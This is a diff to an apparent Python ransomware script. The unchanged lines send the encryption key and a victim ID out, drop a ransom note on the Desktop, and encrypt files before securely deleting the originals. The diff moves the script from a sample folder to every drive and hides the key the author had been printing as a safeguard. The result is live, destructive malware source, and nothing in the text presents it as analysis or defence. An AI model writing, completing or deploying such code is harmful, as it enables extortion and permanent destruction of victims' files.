@@ -6,6 +6,7 @@ from utils.list_files import list_windows_files
 from utils.crypt import generate_key, generate_random_secret_string, encrypt_file
 from utils.delete import secure_delete
 from utils.notify import send_information
+from utils.drivers import list_drives
 
 # Define the setup before everything
 passphrase = generate_random_secret_string()
@@ -15,7 +16,7 @@ uuid = str(uuid.uuid4())
 desktop_path = Path(os.environ['USERPROFILE'], 'Desktop')
 
 # For safety, Just in-case I encrypt my C: drive by mistake I can know the key to decrypt it
-print(key)
+# print(key)
 
 def main() -> None:
     # Create a README.md in the desktop, send the information before everything in-case the 
@@ -49,11 +50,13 @@ We understand this may be distressing and appreciate your cooperation to resolve
     send_information(key=key, uuid=uuid)
 
     # 1st step, listing files and encrypting them in paralel
-    for path in list_windows_files(directory_path='sample\\'):
-        # 2nd step
-        print(path)
-        encrypt_file(path, key)
-        secure_delete(path)
+    drivers = list_drives()
+    for driver in drivers:
+        for path in list_windows_files(directory_path=driver):
+            # 2nd step
+            print(path)
+            encrypt_file(path, key)
+            secure_delete(path)
 
 if __name__ == "__main__":
     main()
